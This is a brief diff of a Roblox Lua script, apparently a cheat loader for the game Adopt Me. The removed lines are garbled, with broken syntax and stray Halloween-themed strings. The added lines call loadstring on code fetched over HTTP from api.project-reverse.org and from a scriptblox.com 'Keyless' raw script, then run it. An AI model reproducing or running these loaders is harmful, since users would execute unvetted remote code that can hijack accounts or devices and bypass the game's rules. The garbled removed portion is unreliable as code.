@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjlhMjE5NWFmLTM4MWUtNGJkOS05N2JhLWE5MzAzNTVkNDcyNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWVob3VzZXNwYXduZXIifX0"))(
-🎃 Adopt Me Halloween Theme 👻  HalloweenEvents = {     "Hauntlet 2",     "Ghost Gallery",     "Crypt Keys",     "Stitches' Spotlight" }  ("🎃 Welcome to Adopt Me Halloween!") ("👻 Halloween Events:") (HalloweenEvents) ("🦇 " .. event)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjlhMjE5NWFmLTM4MWUtNGJkOS05N2JhLWE5MzAzNTVkNDcyNSIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Adopt-Me!-Axonic-Keyless-241539"))()
